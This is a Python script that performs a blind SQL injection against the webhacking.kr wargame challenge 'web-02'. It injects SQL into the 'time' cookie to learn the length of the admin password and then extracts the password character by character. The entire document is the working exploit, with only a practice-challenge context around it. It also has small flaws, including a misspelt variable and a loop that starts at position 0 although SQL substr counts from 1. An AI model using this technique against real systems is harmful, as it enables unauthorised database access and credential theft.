from requests import *
admin_password = ""
URL  = 'http://webhacking.kr/challenge/web/web-02/index.php'
for i in range(0, 30):
    cookies = {'time': '1498214520 and (select length(password) from admin)='+str(i), 'PHPSESSID':'97c4416910f1f3a72a05352251ecc012'}
    res = get(URL, cookies=cookies)
    if "<!--2070-01-01 09:00:01-->" in res.text:
        print "[*] admin's Password lenght is %d" %i
        admin_Lenght = i
        break;

for i in range(0, i):
    for j in range(0, 300):
        cookies = {'time': '1498214520 and (select ascii(substr(password,%d,1)) from admin)=%d' %(i, j), 'PHPSESSID':'97c4416910f1f3a72a05352251ecc012'}
        res = get(URL, cookies=cookies)
        if "<!--2070-01-01 09:00:01-->" in res.text:
            admin_password+=chr(j)
            print "[*] admin's password is %s"  %admin_password
            break;
            
            
